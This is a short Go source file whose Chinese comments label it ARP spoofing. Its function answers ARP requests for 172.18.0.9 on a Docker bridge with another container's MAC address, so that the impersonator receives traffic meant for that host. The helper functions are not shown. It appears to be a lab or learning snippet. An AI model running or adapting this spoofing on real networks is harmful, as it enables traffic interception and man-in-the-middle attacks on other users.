package arp

import (
	"log"
	"net"
)

// arp欺骗
func GoReply() {
	// 网卡名称要根据容器实际用到的网卡名称ip addr查看
	// 查看伪装者的实际mac地址
	// 02:42:ac:11:00:07 这个是172.18.0.4的mac地址
	// 当外者广播要知道172.18.0.9的mac地址是多少时，将172.18.0.4的mac地址告诉外者
	arpHandler, err := NewArpHandler("br-08d723f5a04b", net.ParseIP("172.18.0.9"), net.HardwareAddr{0x02, 0x42, 0xac, 0x11, 0x00, 0x07})
	if err != nil {
		log.Fatal(err)
	}
	defer arpHandler.Close()

	arpHandler.watch()
}
